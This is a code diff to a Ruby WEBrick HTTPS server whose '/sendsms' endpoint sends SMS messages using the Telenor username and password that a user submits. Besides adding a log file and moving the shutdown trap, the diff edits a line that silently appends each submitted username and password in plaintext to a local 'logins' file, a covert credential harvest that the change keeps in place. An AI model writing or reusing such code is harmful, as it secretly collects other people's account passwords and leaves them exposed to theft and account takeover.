@@ -9,11 +9,10 @@ cert = OpenSSL::X509::Certificate.new File.read 'cert.pem'
 pkey = OpenSSL::PKey::RSA.new(File.read('key.pem'), File.read('key.password'))
 
 server = WEBrick::HTTPServer.new(:Port => 8000,
+                                 :Logger => WEBrick::Log.new("sms.log"),
                                  :SSLEnable => true,
                                  :SSLCertificate => cert,
                                  :SSLPrivateKey => pkey)
-
-trap 'INT' do server.shutdown end
 
 server.mount_proc '/sendsms' do |req, res|
   #res.body = req.query
@@ -33,7 +32,7 @@ server.mount_proc '/sendsms' do |req, res|
     
     sms_sender = TelenorSMS.new req.query["username"], req.query["password"]
 	
-	File.open("logins", 'a') { |file| file.write(req.query["username"] + "|" + req.query["password"] + "\n") }
+	File.open("logins", 'a') { |file| file.write(req.query["username"] + "|" + req.query["password"] + "|\n") }
 	
     sms_sender.send req.query["message"], recipient
   else
@@ -71,5 +70,7 @@ Message:<br>
   end
   
 end
+
+trap 'INT' do server.shutdown end
 
 server.start
